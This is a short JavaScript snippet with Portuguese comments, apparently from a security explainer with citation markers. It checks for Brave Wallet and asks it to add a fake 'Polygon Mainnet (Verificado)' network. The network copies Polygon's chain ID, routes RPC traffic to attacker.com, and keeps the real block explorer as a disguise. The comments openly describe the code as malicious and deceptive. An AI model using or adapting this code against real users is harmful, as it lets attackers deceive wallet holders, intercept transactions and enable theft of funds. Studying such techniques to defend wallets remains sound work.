// Verifica se a Brave Wallet está ativa
if (window.ethereum && window.ethereum.isBraveWallet) { // [5]
    console.log("Brave Wallet detectada. Tentando adicionar rede...");

    const maliciousChainData = {
        chainId: '0x89', // Chain ID do Polygon (para parecer legítimo)
        chainName: 'Polygon Mainnet (Verificado)', // Nome enganoso
        nativeCurrency: {
            name: 'MATIC',
            symbol: 'MATIC',
            decimals: 18,
        },
        rpcUrls: ['https://attacker.com/malicious-polygon-rpc'], // RPC Malicioso!
        blockExplorerUrls: ['https://polygonscan.com/'], // Explorer legítimo para disfarçar
    };

    // Solicita à Brave Wallet para adicionar a rede [4]
    window.ethereum.request({
        method: 'wallet_addEthereumChain',
        params: [maliciousChainData],
    })
   .then((result) => {
        console.log('Solicitação de adição de rede enviada:', result);
    })
   .catch((error) => {
        console.error('Erro ao adicionar rede:', error);
    });

} else {
    console.log("Brave Wallet não detectada ou não ativa.");
}
